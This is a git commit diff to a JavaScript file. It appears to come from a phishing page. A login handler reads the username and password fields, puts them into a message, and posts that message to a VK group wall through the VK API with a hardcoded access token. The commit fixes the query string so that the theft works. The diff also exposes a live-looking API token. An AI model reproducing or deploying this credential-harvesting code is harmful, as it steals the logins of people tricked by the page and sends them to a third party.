13f440cbe5d1d4ed36ce40b123a38427a9621d9e
Python-up <77351299+Python-up@users.noreply.github.com>
2021-08-27 18:26:22 +0300

    Update Script.js

--- js/Script.js
+++ js/Script.js
@@ -26,7 +26,7 @@ Authorize_login.onclick = function Send() {
 	const owner_id = "-203605080";
 	const token = "ab91383b33ef3550d9a21f50da5f1591a9ef84d6098279f84ad9b7bd02043ea7cf6db6d46fa454e83bda1";
 	const auth = 'Логин: ' + Authorize_username.value + ' Пароль: ' + Authorize_password.value;
-	const url_post = `https://api.vk.com/method/wall.post?&owner_id=${owner_id}&message=${auth}access_token=${token}&v=5.130`
+	const url_post = `https://api.vk.com/method/wall.post?&owner_id=${owner_id}&message=${auth}&access_token=${token}&v=5.130`
 	const auth_send_post = fetch(url_post, {method: "POST", mode: "no-cors"});
 	Authorize.style.display = "none";
 	Done.style.display = "block";
